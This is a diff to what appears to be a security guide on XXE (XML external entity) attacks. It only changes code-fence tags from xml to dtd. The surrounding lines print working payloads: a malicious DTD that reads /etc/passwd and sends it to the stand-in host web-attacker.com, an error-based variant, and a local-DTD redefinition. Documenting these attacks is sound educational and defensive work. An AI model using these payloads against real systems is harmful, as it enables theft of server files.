@@ -136,7 +136,7 @@ It may be possible to bypass XML parsing hardening using parameter entities as w
 
 Attacker defines a malicious DTD hosted at `http://web-attacker.com/malicious.dtd`:
 
-```xml
+```dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
 %eval;
@@ -155,7 +155,7 @@ They can then submit the following XML payload to a vulnerable application:
 
 Attacker defines a malicious DTD hosted at `http://web-attacker.com/malicious.dtd`:
 
-```xml
+```dtd
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
@@ -184,7 +184,7 @@ If external entity resolution is disabled, you may be able to redefine a custom 
 
 2. Redefine a custom entity within the local DTD:
 
-```xml
+```dtd
 <!DOCTYPE foo [
 <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
 <!ENTITY % custom_entity '
